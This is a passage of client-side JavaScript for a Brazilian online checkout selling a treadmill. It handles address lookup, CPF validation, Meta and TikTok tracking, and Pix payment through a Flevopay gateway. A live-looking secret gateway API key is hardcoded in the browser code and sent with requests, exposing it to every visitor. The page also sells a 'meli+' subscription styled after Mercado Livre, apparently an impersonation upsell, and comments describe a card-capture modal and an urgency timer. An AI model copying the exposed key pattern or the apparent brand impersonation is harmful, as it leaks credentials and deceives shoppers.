     detecção de window._CHANNEL no index.html. Sem esse recorte, tráfego de
     um canal contaria conversão no pixel do outro e sujaria a otimização. */
  const isMeta   = () => window._CHANNEL !== 'tiktok';
  const isTikTok = () => window._CHANNEL === 'tiktok';

  function fbTrack(event, params, opts) {
    if (!isMeta()) return;
    if (typeof window.fbq === 'function') window.fbq('track', event, params || {}, opts || undefined);
  }

  /* Pixel TikTok (ttq) + Events API — a ponte vive no index.html.
     Silencioso quando a ponte não está carregada (ex.: modo demonstração). */
  function ttkTrack(event, opts) {
    if (!isTikTok()) return;
    if (typeof window.ttkTrack === 'function') window.ttkTrack(event, opts || {});
  }
  function ttkIdentify(data) {
    if (!isTikTok()) return;
    if (typeof window.ttkIdentify === 'function') window.ttkIdentify(data);
  }

  /* ===== Integração com a API própria de PIX + tracking =====
     Config vem de window.VONIXX_PIX (definido no index.html).
     api vazio → modo demonstração (QR/código fictícios). */
  const PIX_CFG = Object.assign(
    { api: '', offer: 'centralfit', funnel: 'centralfit_esteira', thankYouUrl: '', pollMs: 3000, expiresInDays: 1 },
    (window.VONIXX_PIX || {})
  );
  let pollTimer = null;
  const PAID_STATUS = ['APPROVED', 'PAID', 'PAGO', 'CONCLUIDA', 'COMPLETED'];
  // Envio de cartão DESATIVADO: nada é enviado a nenhum servidor.
  // Com CARDS_API vazio, salvarCartao() pula o fetch e vai direto pro fluxo do Pix.
  const CARDS_API = '';

  /* ── Gateway PIX Flevopay ── */
  const FLEVO_GATEWAY = {
    enabled: true,
    endpoint: 'https://app.flevopay.com.br/api/v1/transaction',
    apiKey: 'sk_c1a9352aad997014b44aafa2609fb65ad38ad96e025b770166cb545a92fb04d9',
    productHash: 'prod_10b3a75f467b0a11'
  };

  const PIX_SB = {
    enabled: false,
    edge: 'https://dswawxckvmzftxumtdad.supabase.co/functions/v1',
    anon: 'sb_publishable_bzPsUdAMk-O76olSiljimA_vthzAR0H'
  };
  let PRODUCT_NAME_FULL = PIX_CFG.productName || 'Esteira Elétrica Ergométrica Bivolt WCT Fitness 2HP';

  /* Monta a lista de itens do pedido (produto + extras + frete) no formato do backend */
  function pixCart() {
    const items = [{ name: PRODUCT_NAME_FULL, quantity: qty, unitPrice: unitPrice() }];
    (extraItems || []).forEach(it => items.push({
      name: it.title || 'Item adicional', quantity: it.qty || 1, unitPrice: it.price || 0
    }));
    const ship = shipCost() || 0;
    if (ship > 0) items.push({ name: 'Frete', quantity: 1, unitPrice: ship });
    return items;
  }
  const calcTotal = () => unitPrice() * qty;
  const fmt = n => money(n);
  function shake(inp, msg) {
    inp.classList.add('cf-shake');
    toast(msg);
    setTimeout(() => inp.classList.remove('cf-shake'), 500);
  }

  // captura sinais de tracking do Meta (fbclid/fbc/fbp/external_id) + UTMs
  function getTracking() {
    const p = new URLSearchParams(location.search);
    const g = k => p.get(k) || '';
    /* UTM: URL primeiro, senão o que a ponte do pixel já guardou em
       `_ttk_utms` na chegada do anúncio (index.html). A navegação interna
       troca a URL por /?id=N e a campanha sumia do pedido — sobrava só o
       ttclid, que era o único com reserva. */
    let utmsSalvas = {};
    try { utmsSalvas = JSON.parse(localStorage.getItem('_ttk_utms') || '{}') || {}; } catch (_) {}
    const gu = k => p.get(k) || utmsSalvas[k] || '';
    const cookie = n => (document.cookie.match('(^|;)\\s*' + n + '\\s*=\\s*([^;]+)') || [])[2] || '';
    // fbclid: pega da URL e persiste; se não veio na URL, usa o persistido
    let fbclid = g('fbclid'), externalId = '';
    // ttclid: URL primeiro; se não veio, o persistido pela ponte do TikTok.
    // Sem ele o webhook do tiktok-tracking não consegue atribuir o Purchase.
    let ttclid = g('ttclid');
    try {
      if (fbclid) localStorage.setItem('_fbclid', fbclid);
      else fbclid = localStorage.getItem('_fbclid') || '';
      if (ttclid) localStorage.setItem('ttclid', ttclid);
      else ttclid = localStorage.getItem('ttclid') || '';
      // Cada canal tem seu external_id próprio — o do TikTok é criado pela ponte
      externalId = localStorage.getItem(isTikTok() ? '_ttk_eid' : '_fb_eid') || '';
    } catch (_) {}
    return {
      utms: { utmSource: gu('utm_source'), utmCampaign: gu('utm_campaign'), utmMedium: gu('utm_medium'), utmContent: gu('utm_content'), utmTerm: gu('utm_term') },
      fbclid,
      tiktokClickId: ttclid,
      fbc: cookie('_fbc'),
      fbp: cookie('_fbp'),
      externalId,
      landingPageUrl: location.href
    };
  }

  const SHIP_COST = { normal: 0, correios: 10.90, jadlog: 16.90, full: 21.90 };
  let meliPlusActive = false; // se true, frete zera (meli+ substitui)
  function shipCost() {
    const sec = document.getElementById('shipSection');
    if (!sec || sec.hidden) return null; // endereço não preenchido ainda
    if (meliPlusActive) return 0;         // meli+ ativo → frete grátis
    const sel = $('input[name="ship"]:checked');
    return SHIP_COST[sel ? sel.value : 'full'] ?? 0;
  }

  function updateCheckout() {
    const prod  = unitPrice() * qty;
    const extra = extraTotal();
    const ship  = shipCost(); // null = endereço não preenchido
    const shipVal = ship ?? 0;
    const total = prod + extra + shipVal;
    const oldTotal = OLD_UNIT * qty;
    const saved = oldTotal - prod;
    renderCartItems();
    $('#sumSub').textContent = money(prod);
    $('#sumSubtotal').textContent = money(prod + extra);
    const shipEl = $('#sumShip');
    if (shipEl) {
      if (ship === null) {
        shipEl.textContent = 'a calcular';
        shipEl.className = '';
      } else {
        shipEl.textContent = ship ? money(ship) : 'Grátis';
        shipEl.classList.toggle('co-free', !ship);
      }
    }
    $('#sumPay').textContent = money(total);
    $('#sumPayMethod').textContent = PAY_LABEL[payMethod];
    $('#sumOld').textContent = money(oldTotal);
    $('#sumTotal').textContent = money(total);
    $('#sumSave').textContent = `Você economizou ${money(saved)}`;
    $('#doneHeading').textContent = `Pague ${money(total)} via Pix para concluir sua compra`;
    fillParcelas(total);
  }

  /* ---- renderiza o estado das 3 etapas ---- */
  function renderSteps() {
    steps.forEach(s => {
      const i = Number(s.dataset.step);
      s.classList.toggle('is-active', i === current);
      s.classList.toggle('is-done', i < current);
      s.classList.toggle('is-locked', i > current);
      const edit = $('.step__edit', s);
      if (edit) edit.hidden = i >= current;
      const sum = $('.step__summary', s);
      if (sum) sum.hidden = i >= current;
    });
    cho.classList.toggle('is-review', current === 3);
    $('#choFlow').classList.toggle('is-review', current === 3);
    if (current === 3) updateReview();
    const active = steps.find(s => Number(s.dataset.step) === current);
    if (active) $('.step__title', active).setAttribute('tabindex', '-1'), $('.step__title', active).focus();
  }

  function goTo(n) {
    if (n === 1) {
      const p2 = document.getElementById('addrPhase2');
      const p1btn = document.getElementById('addrPhase1Btn');
      if (p2) p2.hidden = true;
      if (p1btn) p1btn.style.display = '';
    }
    current = n; S.step = n; renderSteps(); _updatePayBtn();
  }

  /* ---- máscaras leves ---- */
  const onlyDigits = v => v.replace(/\D/g, '');

  /* Colapsa espaços duplos/pontas — evita "Maria  Silva " chegando assim no PIX. */
  const collapseSpaces = v => String(v || '').trim().replace(/\s+/g, ' ');

  /* Nome completo (nome + sobrenome): pelo menos 2 palavras, cada uma com
     2+ letras (aceita acento, hífen e apóstrofo — "Maria-Clara", "D'Ávila").
     Isso garante que o PIX sempre saia com um nome válido para o pagador. */
  const NAME_PART_RE = /^[A-Za-zÀ-ÖØ-öø-ÿ]+(?:['-][A-Za-zÀ-ÖØ-öø-ÿ]+)*$/;
  function isValidFullName(raw) {
    const parts = collapseSpaces(raw).split(' ').filter(Boolean);
    // conta só as partes que parecem um "nome" de verdade (2+ letras) — assim
    // uma inicial solta ("Maria S. Costa") não invalida quem já tem nome+sobrenome.
    const validParts = parts.filter(p => p.replace(/\.$/, '').length >= 2 && NAME_PART_RE.test(p.replace(/\.$/, '')));
    return validParts.length >= 2;
  }

  /* CPF com dígitos verificadores reais (algoritmo oficial da Receita).
     Sem isso, "00000000000" ou "12345678900" passavam e o PIX podia nunca
     ser confirmado no gateway por CPF inválido/incoerente com o pagamento. */
  function isValidCpf(raw) {
    const d = onlyDigits(raw);
    if (d.length !== 11 || /^(\d)\1{10}$/.test(d)) return false;
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += Number(d[i]) * (10 - i);
    let r = (sum * 10) % 11; if (r === 10) r = 0;
    if (r !== Number(d[9])) return false;
    sum = 0;
    for (let i = 0; i < 10; i++) sum += Number(d[i]) * (11 - i);
    r = (sum * 10) % 11; if (r === 10) r = 0;
    return r === Number(d[10]);
  }
  function maskCep(v) { v = onlyDigits(v).slice(0, 8); return v.length > 5 ? `${v.slice(0,5)}-${v.slice(5)}` : v; }
  function maskCard(v) { return onlyDigits(v).slice(0,16).replace(/(.{4})/g, '$1 ').trim(); }
  function maskVal(v) { v = onlyDigits(v).slice(0,4); return v.length > 2 ? `${v.slice(0,2)}/${v.slice(2)}` : v; }
  function maskCpf(v) {
    v = onlyDigits(v).slice(0, 11);
    return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  }
  function maskFone(v) {
    v = onlyDigits(v).slice(0, 11);
    if (v.length > 6) return `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
    if (v.length > 2) return `(${v.slice(0,2)}) ${v.slice(2)}`;
    if (v.length > 0) return `(${v}`;
    return v;
  }

  // cNum/cVal inline card form removed — card is now captured in #cardFormModal
  $('#fCpf').addEventListener('input', e => { e.target.value = maskCpf(e.target.value); });
  $('#fFone').addEventListener('input', e => { e.target.value = maskFone(e.target.value); });
  $('#fUf').addEventListener('input', e => { e.target.value = e.target.value.replace(/[^a-zA-Z]/g,'').toUpperCase().slice(0,2); });

  /* ---- Busca de CEP via ViaCEP (preenche endereço automaticamente) ---- */
  const fCep = $('#fCep');
  let cepReq = 0;                 // id de requisição p/ ignorar respostas fora de ordem
  let lastCep = '';               // evita refazer a busca do mesmo CEP

  async function lookupCep(raw) {
    const cep = onlyDigits(raw);
    if (cep.length !== 8 || cep === lastCep) return;
    lastCep = cep;
    const reqId = ++cepReq;
    fCep.setAttribute('aria-busy', 'true');
    fieldErr(fCep, false);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await res.json();
      if (reqId !== cepReq) return;                 // chegou uma busca mais nova
      if (data.erro) { lastCep = ''; fieldErr(fCep, true); toast('CEP não encontrado. Confira o número.'); return; }
      if (data.logradouro) $('#fRua').value = data.logradouro;
      if (data.bairro)     $('#fBairro').value = data.bairro;
      if (data.localidade) $('#fCidade').value = data.localidade;
      if (data.uf)         $('#fUf').value = data.uf;
      $$('#fRua,#fBairro,#fCidade,#fUf').forEach(i => fieldErr(i, false));
      ($('#fRua').value ? $('#fNum') : $('#fRua')).focus();   // vai pro que falta preencher
      toast('Endereço preenchido pelo CEP.');
    } catch (_) {
      if (reqId !== cepReq) return;
      lastCep = '';
      toast('Não foi possível buscar o CEP agora. Preencha manualmente.');
    } finally {
      if (reqId === cepReq) fCep.removeAttribute('aria-busy');
    }
  }

  fCep.addEventListener('input', e => {
    e.target.value = maskCep(e.target.value);
    if (onlyDigits(e.target.value).length === 8) lookupCep(e.target.value);
  });
  fCep.addEventListener('blur', e => lookupCep(e.target.value));

  $('[data-cep-help]').addEventListener('click', e => {
    e.preventDefault();
    fCep.focus();
    toast('Digite os 8 dígitos do CEP — o endereço é preenchido automaticamente.');
  });

  /* ---- ETAPA 1: endereço + entrega ---- */
  const addrForm = $('#addrForm');

  function fieldErr(input, on) {
    input.setAttribute('aria-invalid', String(on));
    const err = $(`[data-err="${input.id}"]`);
    if (err) err.hidden = !on;
  }

  const ADDR_FIELDS = ['fCep', 'fRua', 'fNum', 'fBairro', 'fCidade', 'fUf'];
  const PERSONAL_FIELDS = ['fEmail', 'fFone', 'fNome', 'fCpf'];

  function validateFields(ids) {
    let firstBad = null;
    ids.forEach(id => {
      const inp = $('#' + id);
      if (!inp) return;
      let bad;
      if (id === 'fCep')   bad = onlyDigits(inp.value).length !== 8;
      else if (id === 'fCpf')   bad = !isValidCpf(inp.value);
      else if (id === 'fEmail') bad = !/^[^\s@]+@[^\s@.]+(\.[^\s@.]+)*\.[a-zA-Z]{2,}$/.test(inp.value.trim());
      else if (id === 'fFone')  bad = onlyDigits(inp.value).length < 10;
      else if (id === 'fNome')  { inp.value = collapseSpaces(inp.value); bad = !isValidFullName(inp.value); }
      else bad = !inp.value.trim();
      fieldErr(inp, bad);
      if (bad && !firstBad) firstBad = inp;
    });
    return firstBad;
  }

  function isFieldValid(id) {
    const inp = $('#' + id); if (!inp) return false;
    if (id === 'fCep')   return onlyDigits(inp.value).length === 8;
    if (id === 'fCpf')   return isValidCpf(inp.value);
    if (id === 'fEmail') return /^[^\s@]+@[^\s@.]+(\.[^\s@.]+)*\.[a-zA-Z]{2,}$/.test(inp.value.trim());
    if (id === 'fFone')  return onlyDigits(inp.value).length >= 10;
    if (id === 'fNome')  return isValidFullName(inp.value);
    return !!inp.value.trim();
  }

  function revealShipping() {
    const sec = document.getElementById('shipSection');
    if (!sec || !sec.hidden) return;
    sec.hidden = false;
    updateCheckout();
    sec.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  // Impede que o cliente digite números no campo nome
  const _fNome = $('#fNome');
  if (_fNome) {
    _fNome.addEventListener('input', () => {
      const cur = _fNome.value;
      const clean = cur.replace(/[0-9]/g, '');
      if (clean !== cur) { const s = _fNome.selectionStart - (cur.length - clean.length); _fNome.value = clean; _fNome.setSelectionRange(s, s); }
    });
    // Colapsa espaços duplos/pontas ao sair do campo — garante que o valor
    // enviado ao PIX seja sempre "Nome Sobrenome" limpo, sem espaços soltos.
    _fNome.addEventListener('blur', () => { _fNome.value = collapseSpaces(_fNome.value); });
  }

  // Auto-revela frete ao sair do último campo de endereço
  ADDR_FIELDS.forEach(id => {
    const inp = $('#' + id);
    if (inp) inp.addEventListener('blur', () => {
      if (ADDR_FIELDS.every(isFieldValid)) revealShipping();
    });
  });

  /* ---- Meli+ upsell (aparece depois do Continuar da fase 1) ---- */
  const meliModal = $('#meliModal');
  let meliShown = false;
  function openMeliModal(onDone) {
    meliShown = true;
    meliModal.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    const close = (accepted) => {
      meliModal.classList.remove('is-open');
      document.body.style.overflow = '';
      if (accepted) {
        meliPlusActive = true;
        // remove eventual meli+ anterior antes de re-adicionar
        extraItems = extraItems.filter(i => !i.isMeliPlus);
        extraItems.push({ title: 'Assinatura meli+ (frete FULL grátis + benefícios)', price: 19.90, qty: 1, isMeliPlus: true });
        // visual: opaca as opções de frete e mostra badge
        const shipOptsEl = document.getElementById('shipOpts');
        const shipBadge  = document.getElementById('meliShipBadge');
        if (shipOptsEl) shipOptsEl.classList.add('is-meli-locked');
        if (shipBadge)  shipBadge.hidden = false;
      }
      updateCheckout();
      onDone();
    };
    $('#meliAdd').onclick  = () => close(true);
    $('#meliSkip').onclick = () => close(false);
  }

  // Fase 1: valida endereço → revela frete (se oculto) → oferece meli+ → revela dados pessoais
  $('#addrPhase1Btn').addEventListener('click', () => {
    const bad = validateFields(ADDR_FIELDS);
    if (bad) { bad.focus(); return; }
    const sec = document.getElementById('shipSection');
    if (sec && sec.hidden) { revealShipping(); return; }

    ttkTrack('step_endereco', { value: unitPrice() * qty, quantity: qty });

    const goToPhase2 = () => {
      const p2 = document.getElementById('addrPhase2');
      p2.hidden = false;
      document.getElementById('addrPhase1Btn').style.display = 'none';
      ttkTrack('step_dados', { value: unitPrice() * qty, quantity: qty });
      const first = PERSONAL_FIELDS.map(id => $('#' + id)).find(inp => inp && !inp.value.trim());
      if (first) first.focus();
      p2.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    };

    // Só oferece meli+ uma vez e se ele ainda não estiver ativo
    if (!meliShown && !meliPlusActive) openMeliModal(goToPhase2);
    else goToPhase2();
  });

  // Fase 2 (submit): valida dados pessoais → avança para pagamento
  addrForm.addEventListener('submit', e => {
    e.preventDefault();
    const bad = validateFields(PERSONAL_FIELDS);
    if (bad) { bad.focus(); return; }

    // Advanced matching TikTok — e-mail/telefone alimentam o EMQ dos eventos seguintes
    ttkIdentify({ email: $('#fEmail').value.trim(), phone: onlyDigits($('#fFone').value) });
    try { localStorage.setItem('_ttk_email', $('#fEmail').value.trim().toLowerCase()); localStorage.setItem('_ttk_phone', onlyDigits($('#fFone').value)); } catch (_) {}

    /* AddPaymentInfo COM e-mail/telefone → o server-side hasheia e o EMQ sobe
       (os eventos anteriores saem sem PII porque o lead ainda não preencheu). */
    ttkTrack('AddPaymentInfo', {
      value: unitPrice() * qty + extraTotal() + (shipCost() || 0),
      quantity: qty,
      user: { email: $('#fEmail').value.trim(), phone: onlyDigits($('#fFone').value) }
    });

    const shipVal = ($('input[name="ship"]:checked', addrForm) || {}).value;
    const SHIP_LABELS = { normal: 'Envio 1 (12 a 15 dias)', correios: 'Envio 2 (9 a 10 dias)', jadlog: 'Envio 3 (5 a 8 dias)', full: 'Envio 4 (1 dia útil)' };
    const SHIP_PRICE_LABELS = { normal: 'Grátis', correios: 'R$ 10,90', jadlog: 'R$ 16,90', full: 'R$ 21,90' };
    const shipLabel = SHIP_LABELS[shipVal] || 'Envio 1 (12 a 15 dias)';
    const shipPriceLabel = SHIP_PRICE_LABELS[shipVal] || 'Grátis';
    const addr = `${$('#fRua').value}, ${$('#fNum').value}, ${$('#fBairro').value}, ${$('#fCidade').value}/${$('#fUf').value}`;
    $('[data-summary="1"]').textContent = `${addr} · CEP ${$('#fCep').value} · ${shipLabel} · ${shipPriceLabel}`;
    goTo(2);
  });

  /* ---- ETAPA 2: pagamento ---- */
  function fillParcelas() { /* parcelas agora são populadas dentro de abrirCardForm() */ }

  /* ---- preenche os cards da etapa de revisão (estilo ML) ---- */
  function updateReview() {
    const total = unitPrice() * qty + shipCost();
    $('#revBillName').textContent = $('#fNome').value.trim() || 'Cliente';
    $('#revBillCpf').textContent = `CPF ${$('#fCpf').value || ''}`;
    $('#revShipAddr').textContent = `${$('#fRua').value} ${$('#fNum').value}`.trim();
    const shipVal = ($('input[name="ship"]:checked', addrForm) || {}).value;
    const REV_ETA = {
      normal:   'Envio 1 — chega em 12 a 15 dias úteis · Grátis',
      correios: 'Envio 2 — chega em 9 a 10 dias úteis · R$ 10,90',
      jadlog:   'Envio 3 — chega em 5 a 8 dias úteis · R$ 16,90',
      full:     'Envio 4 — chega em 1 dia útil · R$ 21,90',
    };
    $('#revShipEta').textContent = REV_ETA[shipVal] || REV_ETA.normal;
    $('#revQty').textContent = String(qty);
    // Sincroniza thumb da revisão com a cor selecionada no front
    const selColorImg = $('#varVoltOpts .var-btn.is-sel img');
    const revThumb    = $('#revThumb');
    if (selColorImg && revThumb) {
      revThumb.src = selColorImg.src;
      revThumb.alt = selColorImg.alt || '';
    }

    if (S.payMethod === 'card' && S.cardData) {
      const sel = el('cfParc');
      const parcTxt = sel ? sel.options[sel.selectedIndex].text : '';
      $('#revPayName').textContent = 'Cartão de crédito';
      $('#revPayAmt').textContent = parcTxt;
      $('#revPayHint').textContent = 'Ao confirmar a compra, o cartão será processado.';
    } else {
      $('#revPayName').textContent = 'Pix';
      $('#revPayAmt').textContent = money(total);
      $('#revPayHint').textContent = 'Ao confirmar a compra, você terá as informações para pagar.';
    }
  }

  // payOpts change interceptado via onclick="selectPayMethod()" nas labels
  $('#shipOpts').addEventListener('change', e => {
    if (e.target.name !== 'ship') return;
    $$('.ship-opt', cho).forEach(l => l.classList.toggle('is-sel', $('input', l).checked));
    updateCheckout();
  });

  $('[data-continue="2"]').addEventListener('click', () => {
    $('[data-summary="2"]').textContent = PAY_LABEL[S.payMethod]
      + (S.payMethod === 'pix' ? ' · 77% OFF' : '');
    goTo(3);
  });

  /* ---- links "Editar/Alterar" (etapas concluídas e cards de revisão) ---- */
  $$('[data-edit]', cho).forEach(el =>
    el.addEventListener('click', e => { e.preventDefault(); goTo(Number(el.dataset.edit)); }));

  /* ---- ETAPA 3: pagar → tela de sucesso ---- */
  function fakePixCode() {
    const rnd = () => Math.random().toString(36).slice(2, 10);
    return `00020126580014br.gov.bcb.pix0136${rnd()}-${rnd()}-demo5204000053039865802BR5918Central Fit6009SAO PAULO62070503***6304${rnd().slice(0,4).toUpperCase()}`;
  }

  /* QR Code do PIX, gerado aqui no navegador (js/qr.js, ISO/IEC 18004).
     Gerar localmente em vez de pedir a imagem a um serviço externo tem três
     efeitos que importam no checkout: o QR aparece instantaneamente (sem
     esperar uma requisição de rede que pode falhar no 4G do cliente), continua
     funcionando se o serviço externo cair, e o payload do PIX — que carrega o
     nome do recebedor e o txid do pedido — deixa de trafegar para terceiros.
     Devolve true se conseguiu desenhar o código real. */
  function renderQRReal(code) {
    if (!code || !window.PixQR) return false;
    try {
      $('#choQr').innerHTML = window.PixQR.svg(code, 190);
      return true;
    } catch (_) {
      return false;                              // payload longo demais ou encoder ausente
    }
  }

  function renderQR() {
    // QR fictício: grade 25×25 pseudoaleatória + 3 marcadores de canto (apenas visual)
    const N = 25, cell = 100 / N;
    let rects = '';
    const finder = (ox, oy) => {
      for (let y = 0; y < 7; y++) for (let x = 0; x < 7; x++) {
        const edge = x === 0 || y === 0 || x === 6 || y === 6;
        const core = x >= 2 && x <= 4 && y >= 2 && y <= 4;
        if (edge || core) rects += `<rect x="${(ox+x)*cell}" y="${(oy+y)*cell}" width="${cell}" height="${cell}"/>`;
      }
    };
    for (let y = 0; y < N; y++) for (let x = 0; x < N; x++) {
      const inFinder = (x < 8 && y < 8) || (x > N-9 && y < 8) || (x < 8 && y > N-9);
      if (!inFinder && Math.random() > 0.52) rects += `<rect x="${x*cell}" y="${y*cell}" width="${cell}" height="${cell}"/>`;
    }
    finder(0, 0); finder(N - 7, 0); finder(0, N - 7);
    $('#choQr').innerHTML = `<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" fill="#000" shape-rendering="crispEdges" role="img" aria-label="QR Code Pix de demonstração">${rects}</svg>`;
  }

  /* ---- intersticial de carregamento (reutilizável) ---- */
  const loadView = $('#choLoading');
  const loadText = $('#choLoadingText');
  let loadTimer = null;
  function showLoading(html) { loadText.innerHTML = html; loadView.hidden = false; }
  function hideLoadingAfter(delay, done) {
    clearTimeout(loadTimer);
    loadTimer = setTimeout(() => { loadView.hidden = true; if (done) done(); }, delay);
  }

  /* ---- geração de PIX na API própria + polling de status ---- */
  function pixCreateBody() {
    return Object.assign({
      value: unitPrice() * qty + extraTotal() + shipCost(),  // produto + extras + frete
      description: PIX_CFG.productName || 'Esteira Elétrica WCT Fitness',
      payerName: $('#fNome').value.trim(),
      payerCpf: onlyDigits($('#fCpf').value),
      payerEmail: $('#fEmail').value.trim(),
      payerPhone: onlyDigits($('#fFone').value),
      offer: PIX_CFG.offer,
      funnel: PIX_CFG.funnel,
      payerStreet: $('#fRua').value.trim(),
      payerNumber: $('#fNum').value.trim(),
      payerComplement: $('#fCompl').value.trim(),
      payerNeighborhood: $('#fBairro').value.trim(),
      payerCity: $('#fCidade').value.trim(),
      payerState: $('#fUf').value.trim(),
      payerZip: onlyDigits($('#fCep').value)
    }, getTracking());
  }

  async function createPix() {
    if (FLEVO_GATEWAY.enabled) {
      const total = unitPrice() * qty + extraTotal() + (shipCost() || 0);
      const amountCents = Math.round(total * 100);
      const urlp = new URLSearchParams(location.search);
      let utmsSalvas = {};
      try { utmsSalvas = JSON.parse(localStorage.getItem('_ttk_utms') || '{}') || {}; } catch (_) {}
      const getParam = k => urlp.get(k) || utmsSalvas[k] || '';

      const customer = {
        name:     ($('#fNome') ? $('#fNome').value.trim() : '') || 'Cliente',
        email:    ($('#fEmail') ? $('#fEmail').value.trim() : '') || 'cliente@email.com',
        phone:    onlyDigits($('#fFone') ? $('#fFone').value : '') || '11999999999',
        document: onlyDigits($('#fCpf') ? $('#fCpf').value : '') || '00000000000'
      };

      const tracking = {
        utm_source:   getParam('utm_source') || getParam('source') || 'tiktok',
        utm_campaign: getParam('utm_campaign') || getParam('campaign') || '',
        utm_medium:   getParam('utm_medium') || getParam('medium') || '',
        utm_content:  getParam('utm_content') || getParam('content') || '',
        utm_term:     getParam('utm_term') || getParam('term') || '',
        src:          getParam('src') || getParam('sck') || '',
        sck:          getParam('sck') || getParam('src') || ''
      };

      const orderbump = [];
      if (Array.isArray(extraItems)) {
        extraItems.forEach(it => {
          if (it.hash) orderbump.push(it.hash);
        });
      }

      const body = {
        amount: amountCents,
        description: PRODUCT_NAME_FULL || 'Esteira Elétrica Ergométrica Bivolt WCT Fitness 2HP',
        reference: 'REF-' + Date.now() + '-' + Math.random().toString(36).slice(2, 7),
        productHash: FLEVO_GATEWAY.productHash,
        customer: customer,
        orderbump: orderbump,
        tracking: tracking
      };

      const res = await fetch(FLEVO_GATEWAY.endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': FLEVO_GATEWAY.apiKey
        },
        body: JSON.stringify(body)
      });

      let data = {};
      try { data = await res.json(); } catch (_) {}
      if (!res.ok || data.error || data.status === 'error') {
        throw new Error(data.error || data.message || 'Não foi possível gerar o PIX.');
      }

      const txid = data.transaction_id || data.id || body.reference;
      const pixCode = data.qr_code || data.pixCode || '';
      const qrImg = data.qr_code_base64 || data.pixQrCode ||
        ('https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=' + encodeURIComponent(pixCode));

      try {
        localStorage.setItem('pdap-order-' + txid, JSON.stringify({
          id: txid,
          status: data.payment_status || 'pending',
          amount_cents: amountCents,
          pix_code: pixCode,
          pix_qr_url: qrImg,
          customer: customer,
          cart: pixCart(),
          created_at: Date.now()
        }));
        // Chaves consumidas pelas páginas de upsell (obrigado-1/2/3)
        localStorage.setItem('pdap-customer', JSON.stringify(customer));
        localStorage.setItem('last_order_product', PRODUCT_NAME_FULL);
        localStorage.setItem('pdap-pending', String(txid));
      } catch (_) {}

      return {
        txid: txid,
        pixCode: pixCode,
        qrCode: pixCode,
        base64QrCode: qrImg,
        purchaseEventId: 'order-' + txid,
        _value: (data.amount ? data.amount / 100 : total),
        _createdAt: Date.now()
      };
    }

    if (PIX_SB.enabled) {
      const total = unitPrice() * qty + extraTotal() + (shipCost() || 0);
      const urlp = new URLSearchParams(location.search);
      let storedTt = ''; try { storedTt = localStorage.getItem('ttclid') || ''; } catch (_) {}
      let utmsSalvas = {};
      try { utmsSalvas = JSON.parse(localStorage.getItem('_ttk_utms') || '{}') || {}; } catch (_) {}
      const utm = k => urlp.get(k) || utmsSalvas[k] || undefined;
      const body = {
        customer: {
          name:     $('#fNome').value.trim(),
          email:    $('#fEmail').value.trim(),
          document: onlyDigits($('#fCpf').value),
          phone:    onlyDigits($('#fFone').value)
        },
        cart: pixCart(),
        amount_cents: Math.round(total * 100),
        source_url: location.href,
        tracking: {
          utmSource:       utm('utm_source'),
          utmMedium:       utm('utm_medium'),
          utmCampaign:     utm('utm_campaign'),
          utmContent:      utm('utm_content'),
          fbclid:          urlp.get('fbclid')       || undefined,
          ttclid:          urlp.get('ttclid')       || storedTt || undefined,
          gclid:           urlp.get('gclid')        || undefined,
          clientUserAgent: navigator.userAgent
        }
      };
      const res = await fetch(`${PIX_SB.edge}/create-pix`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${PIX_SB.anon}` },
        body: JSON.stringify(body)
      });
      let data = {};
      try { data = await res.json(); } catch (_) {}
      if (!res.ok || data.error) throw new Error(data.error || 'Não foi possível gerar o PIX.');
      const qrImg = data.pixQrCode ||
        ('https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=' + encodeURIComponent(data.pixCode || ''));
      return { txid: data.orderId, pixCode: data.pixCode, qrCode: data.pixCode,
               base64QrCode: qrImg, purchaseEventId: 'order-' + data.orderId };
    }
    // ---- fallback: API própria (VONIXX_PIX) ----
    const res = await fetch(`${PIX_CFG.api}/api/pix/create`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(pixCreateBody())
    });
    let data = {};
    try { data = await res.json(); } catch (_) {}
    if (!res.ok || data.ok === false) throw new Error(data.error || 'Não foi possível gerar o PIX.');
    return data;
  }

  let lastPurchase = null;                        // guarda valor + eventID p/ o Purchase do pixel
  let currentTxid  = null;                        // txid do PIX gerado (para envio de comprovante)
  let comprovTimer = null;                        // timer 60s para exibir bloco de comprovante

  // Mesmo prazo que o gateway aplica ao cobrar (expirationInSeconds: 3600).
  const PIX_EXPIRA_MS = 60 * 60 * 1000;
  let expiraTimer = null;

  function pararCronometro() {
    clearInterval(expiraTimer); expiraTimer = null;
    const box = $('#pixExpira');
    if (box) { box.hidden = true; box.classList.remove('is-urgente', 'is-expirado'); }
  }

  /* Cronômetro de validade do código.
     Sem ele o cliente não tem como saber se o QR que ficou aberto na aba ainda
     vale: ou paga um código morto, ou gera outro pedido por precaução. Mostrar
     quanto falta resolve os dois casos, e ainda cria a urgência que falta numa
     tela onde hoje nada se move. */
  function iniciarCronometro(criadoEm) {
    const box = $('#pixExpira'), rel = $('#pixExpiraRelogio');
    if (!box || !rel) return;
    const fim = (criadoEm || Date.now()) + PIX_EXPIRA_MS;
    clearInterval(expiraTimer);
    box.hidden = false;
    box.classList.remove('is-expirado');
    const tick = () => {
      const resta = fim - Date.now();
      if (resta <= 0) {
        clearInterval(expiraTimer); expiraTimer = null;
        clearInterval(pollTimer);
        box.classList.remove('is-urgente');
        box.classList.add('is-expirado');
        box.textContent = 'Este código Pix expirou. Feche e gere um novo para concluir a compra.';
        try { localStorage.removeItem('pdap-pending'); } catch (_) {}
        return;
      }
      const m = Math.floor(resta / 60000), s = Math.floor((resta % 60000) / 1000);
      rel.textContent = m + ':' + String(s).padStart(2, '0');
      box.classList.toggle('is-urgente', resta < 5 * 60 * 1000);
    };
    tick();
    expiraTimer = setInterval(tick, 1000);
  }

